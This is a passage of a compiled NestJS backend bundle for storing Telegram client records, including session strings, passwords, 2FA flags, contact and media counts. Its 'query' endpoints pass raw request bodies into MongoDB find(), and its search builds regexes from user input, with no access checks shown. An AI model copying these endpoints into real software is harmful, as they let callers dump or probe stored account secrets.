    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':profile/:chatId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    __param(0, (0, common_1.Param)('profile')),
    __param(1, (0, common_1.Param)('chatId')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, update_user_data_dto_1.UpdateUserDataDto]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':profile/:chatId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete user data by ID' }),
    __param(0, (0, common_1.Param)('profile')),
    __param(1, (0, common_1.Param)('chatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "remove", null);
__decorate([
    (0, common_1.Get)('clear-count'),
    __param(0, (0, common_1.Query)('chatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", void 0)
], UserDataController.prototype, "clearCount", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "executeQuery", null);
exports.UserDataController = UserDataController = __decorate([
    (0, swagger_1.ApiTags)('UserData of TG clients'),
    (0, common_1.Controller)('userData'),
    __metadata("design:paramtypes", [user_data_service_1.UserDataService])
], UserDataController);


/***/ }),

/***/ "./src/components/user-data/user-data.module.ts":
/*!******************************************************!*\
  !*** ./src/components/user-data/user-data.module.ts ***!
  \******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserDataModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const user_data_schema_1 = __webpack_require__(/*! ./schemas/user-data.schema */ "./src/components/user-data/schemas/user-data.schema.ts");
const user_data_service_1 = __webpack_require__(/*! ./user-data.service */ "./src/components/user-data/user-data.service.ts");
const user_data_controller_1 = __webpack_require__(/*! ./user-data.controller */ "./src/components/user-data/user-data.controller.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let UserDataModule = class UserDataModule {
};
exports.UserDataModule = UserDataModule;
exports.UserDataModule = UserDataModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.initModule,
            mongoose_1.MongooseModule.forFeature([{ name: user_data_schema_1.UserData.name, schema: user_data_schema_1.UserDataSchema, collection: "userData" }])
        ],
        controllers: [user_data_controller_1.UserDataController],
        providers: [user_data_service_1.UserDataService],
        exports: [user_data_service_1.UserDataService]
    })
], UserDataModule);


/***/ }),

/***/ "./src/components/user-data/user-data.service.ts":
/*!*******************************************************!*\
  !*** ./src/components/user-data/user-data.service.ts ***!
  \*******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserDataService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const user_data_schema_1 = __webpack_require__(/*! ./schemas/user-data.schema */ "./src/components/user-data/schemas/user-data.schema.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils.ts");
let UserDataService = class UserDataService {
    constructor(userDataModel) {
        this.userDataModel = userDataModel;
        this.callCounts = new Map();
    }
    async create(createUserDataDto) {
        const createdUser = new this.userDataModel(createUserDataDto);
        return createdUser.save();
    }
    async findAll() {
        return await this.userDataModel.find().exec();
    }
    async findOne(profile, chatId) {
        const user = (await this.userDataModel.findOne({ profile, chatId }).exec())?.toJSON();
        if (!user) {
            console.warn(`UserData with ID "${profile} - ${chatId}" not found`);
        }
        const currentCount = this.callCounts.get(chatId) || 0;
        this.callCounts.set(chatId, currentCount + 1);
        if (user) {
            return { ...user, count: this.callCounts.get(chatId) };
        }
        else {
            return undefined;
        }
    }
    clearCount(chatId) {
        if (chatId) {
            this.callCounts.delete(chatId);
            return `Count cleared for chatId: ${chatId}`;
        }
        else {
            this.callCounts.clear();
            return 'All counts cleared.';
        }
    }
    async update(profile, chatId, updateUserDataDto) {
        delete updateUserDataDto['_id'];
        console.log(updateUserDataDto);
        const updatedUser = await this.userDataModel.findOneAndUpdate({ profile, chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();
        if (!updatedUser) {
            console.warn(`UserData with ID "${chatId}" not found`);
        }
        return updatedUser;
    }
    async updateAll(chatId, updateUserDataDto) {
        delete updateUserDataDto['_id'];
        const updatedUser = await this.userDataModel.updateMany({ chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();
        if (!updatedUser) {
            console.warn(`UserData with ID "${chatId}" not found`);
        }
        return updatedUser;
    }
    async remove(profile, chatId) {
        const deletedUser = await this.userDataModel.findOneAndDelete({ profile, chatId }).exec();
        if (!deletedUser) {
            console.warn(`UserData with ID "${chatId}" not found`);
        }
        return deletedUser;
    }
    async search(filter) {
        console.log(filter);
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        console.log(filter);
        return this.userDataModel.find(filter).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.userDataModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    async resetPaidUsers() {
        try {
            const entry = await this.userDataModel.updateMany({ $and: [{ payAmount: { $gt: 10 }, totalCount: { $gt: 30 } }] }, {
                $set: {
                    totalCount: 10,
                    limitTime: Date.now(),
                    paidReply: true
                }
            });
        }
        catch (error) {
            (0, utils_1.parseError)(error);
        }
    }
};
exports.UserDataService = UserDataService;
exports.UserDataService = UserDataService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(user_data_schema_1.UserData.name)),
    __metadata("design:paramtypes", [mongoose_2.Model])
], UserDataService);


/***/ }),

/***/ "./src/components/users/dto/create-user.dto.ts":
/*!*****************************************************!*\
  !*** ./src/components/users/dto/create-user.dto.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateUserDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateUserDto {
    constructor() {
        this.twoFA = false;
        this.expired = false;
        this.password = null;
        this.movieCount = 0;
        this.photoCount = 0;
        this.videoCount = 0;
        this.otherPhotoCount = 0;
        this.otherVideoCount = 0;
        this.ownPhotoCount = 0;
        this.ownVideoCount = 0;
        this.contacts = 0;
    }
}
exports.CreateUserDto = CreateUserDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Mobile number of the user', example: '917330803480' }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Session information of the user', example: 'string' }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'First name of the user', example: 'Praveen' }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "firstName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Last name of the user', example: null }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "lastName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Username of the user', example: null }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of channels', example: 56 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "channels", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of personal chats', example: 74 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "personalChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of messages', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "msgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Total number of chats', example: 195 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "totalChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Timestamp of last active', example: '2024-06-03' }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "lastActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Telegram ID of the user', example: '2022068676' }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'TwoFA status', example: false }),
    __metadata("design:type", Boolean)
], CreateUserDto.prototype, "twoFA", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Expiration status', example: false }),
    __metadata("design:type", Boolean)
], CreateUserDto.prototype, "expired", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'password', example: "pass" }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of movies', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "movieCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of photos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "photoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of videos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "videoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Gender of the user', example: null }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "gender", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of other photos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "otherPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of other videos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "otherVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of own photos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "ownPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of own videos', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "ownVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of contacts', example: 105 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "contacts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Call details of the user',
        example: {
            outgoing: 1,
            incoming: 0,
            video: 1,
            chatCallCounts: [],
            totalCalls: 1,
        },
    }),
    __metadata("design:type", Object)
], CreateUserDto.prototype, "calls", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Call details of the user',
        example: []
    }),
    __metadata("design:type", Array)
], CreateUserDto.prototype, "recentUsers", void 0);


/***/ }),

/***/ "./src/components/users/dto/search-user.dto.ts":
/*!*****************************************************!*\
  !*** ./src/components/users/dto/search-user.dto.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchUserDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SearchUserDto {
}
exports.SearchUserDto = SearchUserDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by Telegram ID' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by mobile number' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by twoFA status', type: Boolean }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], SearchUserDto.prototype, "twoFA", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by Expiration status', type: Boolean }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], SearchUserDto.prototype, "expired", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by session' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by first name' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "firstName", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by last name' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "lastName", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by username' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by channels count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "channels", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by personal chats count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "personalChats", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by demo given status', type: Boolean }),
    (0, class_transformer_1.Transform)(({ value }) => value === 'true' || value === true),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], SearchUserDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by messages count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "msgs", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by total chats count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "totalChats", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by last active timestamp' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "lastActive", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by movie count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "movieCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by photo count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "photoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by video count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "videoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by gender' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchUserDto.prototype, "gender", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by other photo count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "otherPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by other video count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "otherVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by own photo count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "ownPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by own video count' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], SearchUserDto.prototype, "ownVideoCount", void 0);


/***/ }),

/***/ "./src/components/users/dto/update-user.dto.ts":
/*!*****************************************************!*\
  !*** ./src/components/users/dto/update-user.dto.ts ***!
  \*****************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateUserDto = void 0;
const mapped_types_1 = __webpack_require__(/*! @nestjs/mapped-types */ "@nestjs/mapped-types");
const create_user_dto_1 = __webpack_require__(/*! ./create-user.dto */ "./src/components/users/dto/create-user.dto.ts");
class UpdateUserDto extends (0, mapped_types_1.PartialType)(create_user_dto_1.CreateUserDto) {
}
exports.UpdateUserDto = UpdateUserDto;


/***/ }),

/***/ "./src/components/users/schemas/user.schema.ts":
/*!*****************************************************!*\
  !*** ./src/components/users/schemas/user.schema.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserSchema = exports.User = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let User = class User {
    constructor() {
        this.twoFA = false;
        this.expired = false;
        this.password = null;
    }
};
exports.User = User;
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], User.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], User.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "firstName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: false }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "lastName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: false }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "channels", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "personalChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Boolean)
], User.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "msgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "totalChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "lastActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], User.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "movieCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "photoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "videoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ required: false }),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", String)
], User.prototype, "gender", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Boolean }),
    __metadata("design:type", Boolean)
], User.prototype, "twoFA", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Boolean, default: false }),
    __metadata("design:type", Boolean)
], User.prototype, "expired", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", String)
], User.prototype, "password", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "otherPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "otherVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "ownPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "ownVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)(),
    __metadata("design:type", Number)
], User.prototype, "contacts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)(),
    (0, mongoose_1.Prop)({
        type: mongoose_2.default.Schema.Types.Mixed,
        default: {
            outgoing: 0,
            incoming: 0,
            video: 0,
            chatCallCounts: [],
            totalCalls: 0,
        },
    }),
    __metadata("design:type", Object)
], User.prototype, "calls", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)(),
    (0, mongoose_1.Prop)({
        type: mongoose_2.default.Schema.Types.Mixed,
        default: [],
        required: false,
    }),
    __metadata("design:type", Array)
], User.prototype, "recentUsers", void 0);
exports.User = User = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'users', versionKey: false, autoIndex: true, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], User);
exports.UserSchema = mongoose_1.SchemaFactory.createForClass(User);


/***/ }),

/***/ "./src/components/users/users.controller.ts":
/*!**************************************************!*\
  !*** ./src/components/users/users.controller.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UsersController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const users_service_1 = __webpack_require__(/*! ./users.service */ "./src/components/users/users.service.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const search_user_dto_1 = __webpack_require__(/*! ./dto/search-user.dto */ "./src/components/users/dto/search-user.dto.ts");
const update_user_dto_1 = __webpack_require__(/*! ./dto/update-user.dto */ "./src/components/users/dto/update-user.dto.ts");
const create_user_dto_1 = __webpack_require__(/*! ./dto/create-user.dto */ "./src/components/users/dto/create-user.dto.ts");
let UsersController = class UsersController {
    constructor(usersService) {
        this.usersService = usersService;
    }
    async create(createUserDto) {
        console.log("creating new user");
        return this.usersService.create(createUserDto);
    }
    async search(queryParams) {
        return this.usersService.search(queryParams);
    }
    async findAll() {
        return this.usersService.findAll();
    }
    async findOne(tgId) {
        return this.usersService.findOne(tgId);
    }
    async update(tgId, updateUserDto) {
        return this.usersService.update(tgId, updateUserDto);
    }
    async remove(tgId) {
        return this.usersService.delete(tgId);
    }
    async executeQuery(requestBody) {
        const { query, sort, limit, skip } = requestBody;
        try {
            return await this.usersService.executeQuery(query, sort, limit, skip);
        }
        catch (error) {
            throw error;
        }
    }
};
exports.UsersController = UsersController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new user' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_user_dto_1.CreateUserDto]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('/search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search users based on various parameters' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_user_dto_1.SearchUserDto]),
    __metadata("design:returntype", Promise)
], UsersController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all users' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
